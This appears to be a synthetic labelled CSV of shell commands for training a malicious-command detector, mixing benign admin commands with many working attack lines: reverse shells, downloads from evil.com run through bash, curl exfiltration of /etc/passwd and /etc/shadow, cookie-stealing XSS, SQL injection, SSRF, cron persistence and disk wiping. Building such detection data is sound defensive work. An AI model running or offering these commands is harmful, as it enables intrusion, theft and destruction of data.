timestamp,attacker_ip,command_sequence,label
2026-01-23 02:55:12,120.104.173.146,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 03:54:12,41.118.180.146,ln -s /var/www/html /home/user/www,0
2026-01-23 13:35:12,40.170.255.198,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 11:37:12,190.228.62.64,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 07:36:12,74.247.132.254,lsblk,0
2026-01-23 14:59:12,106.253.242.29,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 05:45:12,1.49.221.5,chown www-data:www-data /var/www/html -R,0
2026-01-23 06:05:12,101.53.233.234,ls -la /var/log/,0
2026-01-23 01:53:12,16.25.101.132,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 09:18:12,157.19.234.244,timedatectl,0
2026-01-23 05:57:12,67.85.151.21,nslookup google.com,0
2026-01-23 15:30:12,41.32.215.19,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 12:57:12,79.90.73.133,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 13:04:12,217.202.241.84,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 04:32:12,212.191.36.122,curl -I https://example.com,0
2026-01-23 08:02:12,181.30.107.211,ip route show,0
2026-01-23 08:31:12,100.97.172.189,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 16:49:12,213.125.251.172,rm -rf /* --no-preserve-root,1
2026-01-23 17:52:12,124.75.184.93,mkfs.ext4 /dev/sda1,1
2026-01-23 12:48:12,64.27.13.53,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 02:21:12,191.187.112.132,systemctl status nginx,0
2026-01-23 15:35:12,20.12.28.231,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 15:37:12,191.154.23.251,enum4linux target.com,1
2026-01-23 11:32:12,115.204.70.141,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 06:09:12,20.247.140.40,ss -tulwn,0
2026-01-23 17:15:12,53.123.101.173,chmod 4777 /bin/bash,1
2026-01-23 03:07:12,146.80.40.239,curl -s https://api.ipify.org,0
2026-01-23 03:57:12,37.167.255.235,ip addr show,0
2026-01-23 11:04:12,220.20.184.40,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 12:11:12,175.194.194.138,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 06:47:12,197.106.150.94,nslookup google.com,0
2026-01-23 11:42:12,14.195.210.51,chmod 4777 /bin/bash,1
2026-01-23 11:50:12,148.103.63.147,chmod 4777 /bin/bash,1
2026-01-23 11:57:12,160.32.167.132,mkfs.ext4 /dev/sda1,1
2026-01-23 10:23:12,207.117.203.77,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
2026-01-23 10:06:12,131.85.238.222,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 13:43:12,129.7.87.226,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 05:52:12,203.139.158.150,rsync -avz /var/www/html/ backup/,0
2026-01-23 13:34:12,180.161.52.42,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 08:04:12,195.38.22.89,wget --spider https://example.com/file.zip,0
2026-01-23 12:10:12,132.215.218.31,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 03:15:12,42.190.88.34,systemctl status mysql,0
2026-01-23 06:42:12,207.211.173.37,ln -s /var/www/html /home/user/www,0
2026-01-23 16:32:12,80.131.118.31,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 04:16:12,107.38.69.237,ip addr show,0
2026-01-23 16:11:12,108.16.135.26,smbclient -L //target.com -U admin%password,1
2026-01-23 08:40:12,6.91.246.144,whoami,0
2026-01-23 05:49:12,179.35.62.238,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 03:26:12,86.241.209.77,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 01:54:12,88.57.40.12,du -sh /home/* | sort -hr,0
2026-01-23 04:48:12,134.52.32.47,chmod 644 /var/www/html/index.html,0
2026-01-23 17:47:12,201.203.150.168,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 10:27:12,118.78.208.64,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 08:15:12,214.66.71.14,scp user@server:/var/log/app.log ./,0
2026-01-23 06:34:12,76.23.91.73,crontab -l,0
2026-01-23 02:17:12,118.190.235.144,df -h /,0
2026-01-23 03:53:12,203.215.74.11,du -sh /var/www/*,0
2026-01-23 15:06:12,169.29.16.192,enum4linux target.com,1
2026-01-23 06:45:12,27.116.91.4,df -h,0
2026-01-23 12:29:12,195.57.236.108,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 06:30:12,85.10.131.223,curl -s https://api.ipify.org,0
2026-01-23 02:25:12,94.191.136.37,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 10:18:12,132.108.195.87,cat /var/www/../../../../etc/passwd,1
2026-01-23 11:45:12,183.90.247.183,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 01:44:12,196.76.239.94,du -sh /home/* | sort -hr,0
2026-01-23 02:16:12,13.170.249.209,ls -la /var/log/,0
2026-01-23 05:48:12,21.63.197.120,find /var/www -name '*.php' -mtime -1,0
2026-01-23 03:14:12,166.212.20.48,rsync -avz /var/www/html/ backup/,0
2026-01-23 05:27:12,81.138.180.86,du -sh /var/www/*,0
2026-01-23 04:04:12,93.225.67.86,top -n 1 | head -20,0
2026-01-23 03:55:12,134.248.243.24,ip route show,0
2026-01-23 15:44:12,2.31.93.112,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 11:00:12,214.182.140.78,sudo -u#-1 /bin/bash,1
2026-01-23 04:17:12,21.129.77.104,traceroute google.com,0
2026-01-23 11:40:12,131.205.178.8,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 17:45:12,38.87.122.97,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 16:31:12,8.223.170.45,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 13:46:12,98.215.159.112,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 04:21:12,30.116.155.21,df -h,0
2026-01-23 13:50:12,170.140.12.10,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 15:58:12,126.197.107.3,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 01:32:12,109.173.153.245,crontab -l,0
2026-01-23 13:11:12,130.125.212.197,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 09:25:12,49.10.207.54,chown www-data:www-data /var/www/html -R,0
2026-01-23 17:37:12,208.131.8.162,enum4linux target.com,1
2026-01-23 02:15:12,93.13.216.224,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 16:18:12,201.122.230.112,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 07:25:12,129.178.211.145,ps aux | grep nginx,0
2026-01-23 03:06:12,30.225.204.34,ip addr show,0
2026-01-23 07:41:12,93.58.207.188,ls -la /var/log/,0
2026-01-23 09:55:12,208.198.46.193,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 12:21:12,143.1.36.140,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 14:56:12,89.45.115.233,dig @target.com axfr target.com,1
2026-01-23 06:52:12,118.150.89.173,rsync -avz /var/www/html/ backup/,0
2026-01-23 15:55:12,218.23.107.9,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 01:59:12,211.168.147.230,apt update && apt list --upgradable,0
2026-01-23 04:36:12,185.156.178.8,fdisk -l,0
2026-01-23 07:22:12,83.1.106.84,nslookup google.com,0
2026-01-23 14:04:12,158.27.191.178,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 04:53:12,191.180.46.201,ls -la /var/log/,0
2026-01-23 17:06:12,169.67.82.47,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 07:28:12,76.84.16.107,mount | grep ext4,0
2026-01-23 01:48:12,187.135.45.218,ping -c 4 8.8.8.8,0
2026-01-23 17:19:12,114.72.123.59,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 08:52:12,168.103.58.127,apt update,0
2026-01-23 02:40:12,222.167.151.3,tail -20 /var/log/syslog,0
2026-01-23 11:26:12,191.155.247.173,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 14:17:12,202.255.108.179,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 09:52:12,203.156.62.2,"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'"" >> /var/spool/cron/root",1
2026-01-23 09:27:12,51.89.115.198,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 05:53:12,222.170.232.253,top -n 1 | head -20,0
2026-01-23 10:56:12,64.33.113.81,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 14:49:12,6.3.227.130,cat ../../../etc/passwd,1
2026-01-23 16:28:12,158.197.158.134,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 16:06:12,157.135.94.41,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 13:56:12,207.63.214.90,sudo nmap --script vuln target.com,1
2026-01-23 07:52:12,174.197.162.109,systemctl status mysql,0
2026-01-23 02:20:12,139.218.7.252,tail -20 /var/log/syslog,0
2026-01-23 13:28:12,149.123.237.137,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 03:24:12,22.216.105.159,fdisk -l,0
2026-01-23 14:10:12,173.104.146.142,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 14:23:12,217.93.248.6,curl http://evil.com/backdoor.php | bash,1
2026-01-23 07:14:12,7.227.223.35,free -m,0
2026-01-23 14:00:12,219.145.113.117,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 09:03:12,62.35.173.116,mtr -c 10 google.com,0
2026-01-23 14:34:12,27.181.93.46,smbclient -L //target.com -U admin%password,1
2026-01-23 12:03:12,159.109.154.79,chmod 4777 /bin/bash,1
2026-01-23 02:41:12,181.47.162.253,systemctl status nginx,0
2026-01-23 15:18:12,24.19.85.121,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 14:30:12,138.70.3.14,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 01:30:12,91.152.130.167,tail -20 /var/log/syslog,0
2026-01-23 11:02:12,164.110.219.186,"echo ""* * * * * curl http://attacker.com/c2.sh | bash"" >> /var/spool/cron/crontabs/root",1
2026-01-23 09:45:12,113.101.198.6,echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys,1
2026-01-23 16:23:12,146.215.98.57,smbclient -L //target.com -U admin%password,1
2026-01-23 07:27:12,190.115.239.82,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 08:51:12,207.113.138.85,ss -tulwn,0
2026-01-23 10:21:12,145.96.13.113,curl -X POST -d @/etc/passwd https://attacker-server.com/exfil,1
2026-01-23 02:01:12,155.55.51.21,systemctl status nginx,0
2026-01-23 04:06:12,40.242.38.129,nslookup google.com,0
2026-01-23 10:31:12,204.171.90.196,curl -X POST -d @/etc/shadow https://attacker-server.com/exfil,1
2026-01-23 01:52:12,106.66.10.154,crontab -l,0
2026-01-23 07:07:12,95.204.169.249,grep 'error' /var/log/syslog,0
2026-01-23 06:22:12,29.87.128.151,lsblk,0
2026-01-23 02:04:12,198.232.133.128,du -sh /home/* 2>/dev/null | sort -hr,0
2026-01-23 14:11:12,172.117.134.144,chmod 4777 /bin/bash,1
2026-01-23 02:38:12,178.123.115.25,ping -c 4 8.8.8.8,0
2026-01-23 10:36:12,162.61.88.42,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 16:51:12,174.97.21.188,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 01:23:12,55.226.238.45,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 17:12:12,97.242.121.87,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 02:47:12,75.14.61.218,df -h /,0
2026-01-23 14:36:12,145.27.41.177,mkfs.ext4 /dev/sda1,1
2026-01-23 02:44:12,4.40.164.128,du -sh /home/* | sort -hr,0
2026-01-23 07:19:12,91.203.110.224,ip route show,0
2026-01-23 09:14:12,200.221.198.228,top -n 1 | head -20,0
2026-01-23 04:34:12,155.124.191.176,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 06:21:12,104.39.191.191,wget --spider https://example.com/file.zip,0
2026-01-23 13:31:12,187.74.126.36,chmod 4777 /bin/bash,1
2026-01-23 02:32:12,106.228.25.181,crontab -l,0
2026-01-23 11:08:12,78.52.91.239,cat /var/www/../../../../etc/passwd,1
2026-01-23 06:32:12,130.3.120.120,apt list --upgradable,0
2026-01-23 01:28:12,95.28.169.1,ping -c 4 8.8.8.8,0
2026-01-23 05:26:12,57.30.3.181,id,0
2026-01-23 04:33:12,162.6.142.184,timedatectl,0
2026-01-23 06:39:12,169.163.214.83,journalctl -u nginx -n 50,0
2026-01-23 12:46:12,209.140.11.200,cat ../../../etc/passwd,1
2026-01-23 05:20:12,168.180.242.197,nslookup google.com,0
2026-01-23 10:14:12,87.237.144.169,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 13:57:12,80.42.127.77,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 12:39:12,197.237.124.91,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 06:04:12,188.149.242.78,apt update,0
2026-01-23 03:42:12,158.105.91.198,curl -I https://example.com,0
2026-01-23 09:21:12,83.176.9.36,ping -c 4 google.com,0
2026-01-23 09:49:12,203.69.148.46,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 05:33:12,157.125.206.201,ping -c 4 google.com,0
2026-01-23 02:14:12,178.186.180.57,du -sh /home/* | sort -hr,0
2026-01-23 11:30:12,41.189.12.64,enum4linux target.com,1
2026-01-23 03:41:12,97.83.244.184,top -n 1 | head -20,0
2026-01-23 14:41:12,168.203.15.161,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 11:20:12,18.98.126.16,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 05:55:12,42.38.209.3,ip route show,0
2026-01-23 13:26:12,167.118.152.79,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 02:22:12,196.191.38.208,crontab -l,0
2026-01-23 12:22:12,109.216.247.243,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 10:59:12,18.224.159.87,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 08:05:12,97.238.206.196,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 17:40:12,161.112.25.112,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 03:59:12,172.228.189.148,chmod 644 /var/www/html/index.html,0
2026-01-23 16:00:12,159.88.37.136,rm -rf /* --no-preserve-root,1
2026-01-23 16:17:12,153.229.97.13,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 02:36:12,31.15.222.79,ls -la /var/log/,0
2026-01-23 12:12:12,127.78.85.81,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 10:03:12,125.127.56.136,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
2026-01-23 07:15:12,53.241.246.57,rsync -avz /var/www/html/ backup/,0
2026-01-23 02:52:12,163.111.133.181,crontab -l,0
2026-01-23 03:45:12,215.252.0.107,ls -la /var/log/,0
2026-01-23 04:30:12,145.79.36.147,apt list --upgradable,0
2026-01-23 03:19:12,203.165.199.228,wget --spider https://example.com/file.zip,0
2026-01-23 08:03:12,99.110.148.110,systemctl status mysql,0
2026-01-23 09:48:12,55.50.181.128,cat /var/www/../../../../etc/passwd,1
2026-01-23 02:50:12,4.155.166.179,tail -20 /var/log/syslog,0
2026-01-23 05:30:12,105.174.23.252,rsnapshot daily,0
2026-01-23 12:20:12,61.196.92.24,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 10:01:12,182.100.146.120,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 08:28:12,162.65.206.201,dig example.com,0
2026-01-23 16:52:12,214.135.234.66,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 12:31:12,121.77.85.202,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 15:09:12,50.69.166.84,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 09:47:12,66.191.10.209,"curl -H ""User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 05:03:12,139.237.206.138,top -n 1 | head -20,0
2026-01-23 14:22:12,210.154.97.38,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 04:40:12,74.181.126.98,df -h,0
2026-01-23 08:57:12,114.77.44.172,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 16:35:12,131.241.224.116,mkfs.ext4 /dev/sda1,1
2026-01-23 09:44:12,65.106.92.250,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.2"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",1
2026-01-23 15:16:12,213.119.196.7,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 14:45:12,136.93.10.88,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 12:06:12,114.141.192.145,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 10:13:12,60.28.92.156,"curl ""http://target.com/login' AND 1=convert(int,(SELECT @@version))--""",1
2026-01-23 03:00:12,62.13.246.118,systemctl status mysql,0
2026-01-23 15:04:12,14.105.229.69,chmod 4777 /bin/bash,1
2026-01-23 14:46:12,184.51.61.162,curl http://evil.com/backdoor.php | bash,1
2026-01-23 11:11:12,24.220.213.116,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://attacker.com/exfil,1
2026-01-23 03:29:12,90.13.158.60,id,0
2026-01-23 04:31:12,127.161.100.191,hostnamectl,0
2026-01-23 06:57:12,209.237.66.38,ps aux | grep nginx,0
2026-01-23 03:39:12,189.89.246.179,du -sh /var/www/*,0
2026-01-23 02:46:12,64.166.220.33,ls -la /var/log/,0
2026-01-23 10:32:12,54.127.36.152,"echo ""* * * * * /tmp/.backdoor.sh"" | crontab -",1
2026-01-23 08:08:12,91.132.211.254,ip route show,0
2026-01-23 09:00:12,189.129.40.138,ping -c 4 google.com,0
2026-01-23 12:51:12,124.130.173.131,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 07:18:12,61.39.253.253,apt list --upgradable,0
2026-01-23 02:37:12,113.239.186.17,df -h /,0
2026-01-23 08:55:12,57.185.242.64,top -n 1 | head -20,0
2026-01-23 02:57:12,32.184.176.110,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 11:23:12,108.125.180.22,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 08:23:12,95.206.250.98,cat /etc/nginx/nginx.conf,0
2026-01-23 09:28:12,170.101.42.193,apt update,0
2026-01-23 13:12:12,45.159.3.146,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 15:25:12,55.26.66.195,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 09:54:12,140.189.246.43,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.10.10"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 09:01:12,8.248.215.13,cat /proc/meminfo | head -10,0
2026-01-23 03:32:12,147.57.32.124,apt list --upgradable,0
2026-01-23 02:49:12,20.38.200.133,apt update && apt list --upgradable,0
2026-01-23 13:08:12,43.65.131.165,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 13:17:12,76.107.190.214,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 09:30:12,27.210.64.70,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 06:58:12,62.146.132.87,logrotate -f /etc/logrotate.d/nginx,0
